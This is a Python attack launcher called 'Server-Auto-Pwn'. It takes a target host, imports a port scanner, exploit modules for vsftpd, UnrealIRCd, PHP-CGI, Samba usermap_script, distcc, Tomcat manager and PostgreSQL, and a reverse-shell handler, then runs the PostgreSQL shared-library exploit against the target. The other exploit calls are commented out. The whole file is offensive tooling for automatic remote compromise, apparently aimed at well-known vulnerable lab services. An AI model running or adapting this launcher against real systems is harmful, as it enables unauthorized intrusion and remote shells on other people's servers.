#!/usr/bin/env python3

import argparse

import recon.portscan.connect_tcp.main
import exploits.ftp.vsftpd_123.main
import exploits.irc.unrealircd_3281.main
import exploits.http.php_cgi_arg_injection.main
import exploits.samba.usermap_script.main
import exploits.distcc.distcc_cmd_exec.main
import exploits.http.tomcat_mgr_deploy.main
import exploits.sql.postgresql.postgres_sharedlib_exec.main
import auxiliary.reverse_handler.main

class SAP(object):
    """
    Server-Auto-Pwn
    """
    def __init__(self):
        super(SAP, self).__init__()
        self.parser = argparse.ArgumentParser()
        self.parser.add_argument('target', help='IP address or hostname of target')
        self.parser.add_argument('-t', '--threads', type=int, default=100, help='Amounts of threads, default 1')
        self.parser.add_argument('--timeout', type=float, default=3, help='Socket timeout, default is 3')
        self.parser.add_argument('--banner-wait', type=float, default=3, help='Default banner wait, default is 3')
        self.args = self.parser.parse_args()
        self.data = {'services':[]}

    def run(self):
        #data = recon.portscan.connect_tcp.main.run(self.args, self.data, auxiliary.reverse_handler.main)
        #exploits.ftp.vsftpd_123.main.run(self.args, self.data, auxiliary.reverse_handler.main)
        #exploits.http.php_cgi_arg_injection.main.run(self.args, self.data, auxiliary.reverse_handler.main)
        #exploits.irc.unrealircd_3281.main.run(self.args, self.data, auxiliary.reverse_handler.main)
        #exploits.distcc.distcc_cmd_exec.main.run(self.args, self.data, auxiliary.reverse_handler.main)
        #exploits.samba.usermap_script.main.run(self.args, self.data, auxiliary.reverse_handler.main)
        #exploits.http.tomcat_mgr_deploy.main.run(self.args, self.data, auxiliary.reverse_handler.main)
        exploits.sql.postgresql.postgres_sharedlib_exec.main.run(self.args, self.data, auxiliary.reverse_handler.main)

if __name__ == '__main__':
    sap = SAP()
    sap.run()
